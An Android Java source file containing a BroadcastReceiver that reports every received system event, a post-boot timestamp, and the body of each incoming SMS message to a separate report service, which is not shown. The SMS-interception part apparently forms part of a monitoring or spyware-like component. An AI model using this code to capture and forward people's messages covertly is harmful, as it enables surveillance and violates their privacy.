package com.rosetta.dynamit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.text.DateFormat;
import java.util.Date;

import static com.rosetta.dynamit.MainActivity.DATA_KEY;


public class EventHandler extends BroadcastReceiver {

    public static final String EVENT_KEY = "event";

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.

        String action = intent.getAction().toString();
        Log.d("event:", action);
        Intent reportServiceIntent = new Intent(context, ReportService.class);

        reportServiceIntent.putExtra(DATA_KEY, EVENT_KEY + ":" + action);
        context.startService(reportServiceIntent);

        if (intent.getAction().equals("android.intent.action.BOOT_COMPLETED")) {
            String secondDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
            reportServiceIntent.putExtra(DATA_KEY, "time_stamp_after_boot:" + secondDateTimeString);
            context.startService(reportServiceIntent);
        }

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null) {
                //---retrieve the SMS message received---
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];
                    for (int i = 0; i < msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        msg_from = msgs[i].getOriginatingAddress();
                        String msgBody = msgs[i].getMessageBody();

                        reportServiceIntent.putExtra(DATA_KEY, "SMS:" + msgBody);
                        context.startService(reportServiceIntent);
                    }
                } catch (Exception e) {
//                            Log.d("Exception caught",e.getMessage());

                }
            }
        }
    }
}
